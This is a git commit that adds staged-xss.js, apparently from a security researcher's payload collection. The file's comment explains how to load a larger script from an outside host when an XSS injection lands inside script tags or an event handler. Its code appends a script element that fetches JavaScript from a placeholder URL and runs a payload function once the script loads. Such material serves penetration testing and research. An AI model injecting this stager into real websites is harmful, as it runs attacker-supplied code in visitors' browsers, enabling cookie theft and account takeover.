0b4d052d7acdccd605890e3cc2c962adc1a639fe
Luke Stephens (hakluke) <13975395+hakluke@users.noreply.github.com>
2019-06-18 14:44:03 +1000

    Create staged-xss.js

---
+++ staged-xss.js
@@ -0,0 +1,22 @@
+/*
+Daniel Moore (https://twitter.com/0x0FEFF) sent me a great way to stage external JS code without injecting HTML.
+In the event that your payload stuck inside <script> tags, or an HTML event handler and you want to load an external JS resource, 
+you can inject this snippet to stage a more complex payload from an external resource.
+
+The external JS payload needs to be inside a function called "a" like this:
+
+var a=function(){
+  // payload here
+  }
+
+*/
+
+
+var c=function(){
+    a() // a() is defined in the script downloaded by the payload
+};
+var s=document.createElement('script');
+s.src='//bit.ly/example';
+s.onreadystatechange=c;
+document.body.appendChild(s)
+
